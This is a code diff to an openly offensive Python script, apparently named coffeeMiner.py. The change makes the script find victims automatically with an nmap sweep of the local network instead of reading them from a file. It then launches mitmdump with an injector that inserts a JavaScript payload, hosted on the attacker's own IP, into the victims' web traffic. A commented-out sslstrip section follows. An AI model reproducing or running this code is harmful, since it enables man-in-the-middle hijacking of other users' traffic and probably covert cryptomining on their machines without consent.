@@ -1,11 +1,30 @@
 import os
 import sys
+import subprocess
+import nmap
 
+#check len params
+if len(sys.argv) < 4:
+	print("Usage python coffeeMiner.py <gateway> <network> <yourip>")
+	sys.exit(0)
 #get gateway_ip (router)
 gateway = sys.argv[1]
+#get network
+network = sys.argv[2]
+#get yourip
+yourip = sys.argv[3]
+
 print("gateway: " + gateway)
+print("network: " + network)
+print("yourip:  " + yourip)
+
 # get victims_ip
-victims = [line.rstrip('\n') for line in open("victims.txt")]
+#victims = [line.rstrip('\n') for line in open("victims.txt")]
+nm = nmap.PortScanner()
+nm.scan(hosts=network, arguments='-n -sP')
+victims = nm.all_hosts()
+victims.remove(gateway)
+victims.remove(yourip)
 print("victims:")
 print(victims)
 
@@ -25,8 +44,7 @@ for victim in victims:
 os.system("xterm -hold -e 'python3 httpServer.py' &")
 
 # start the mitmproxy
-os.system("~/.local/bin/mitmdump -s 'injector.py http://192.168.1.32:8000/script.js' -T")
-
+os.system("~/.local/bin/mitmdump -s 'injector.py http://"+yourip+":8000/script.js' -T")
 
 '''
 # run sslstrip
